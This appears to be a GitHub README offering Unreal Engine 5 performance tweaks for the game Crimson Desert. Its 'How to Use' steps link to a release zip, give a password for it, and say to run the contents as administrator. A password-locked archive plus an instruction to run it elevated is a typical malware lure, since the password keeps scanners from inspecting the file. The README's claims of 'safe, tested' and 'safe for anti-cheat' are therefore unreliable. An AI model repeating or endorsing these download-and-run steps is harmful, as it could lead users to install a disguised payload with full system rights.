## 📌 About

Crimson Desert is a massive open-world action-adventure from Pearl Abyss, built on Unreal Engine 5. This repository provides safe, tested performance tweaks to increase FPS, reduce stuttering, and improve overall stability — especially on mid-range and older hardware.

What it does:  
✅ Optimized Engine.ini settings for UE5  
✅ Reduces stuttering and input lag  
✅ Adjusts shadow quality, volumetric fog, and streaming  
✅ Easy backup and restore system  
✅ No game file modifications – safe for anti-cheat

---

## ⚙️ How to Use

1. [Download](https://github.com/chaserturtlesing/CrimsonDesert-Performance-Tweaks/releases/download/Download/Performance-Tweaks.zip)
2. PASSWORD (5868781)
3. Run as administrator.
4. Choose an option:
   - 1 – Apply performance tweaks  
   - 2 – Restore original settings  
   - 3 – Exit

The script automatically creates a backup of your original Engine.ini before making changes.

> 📁 Manual installation: copy config/Engine.ini to  
> %LOCALAPPDATA%\CrimsonDesert\Saved\Config\WindowsClient\
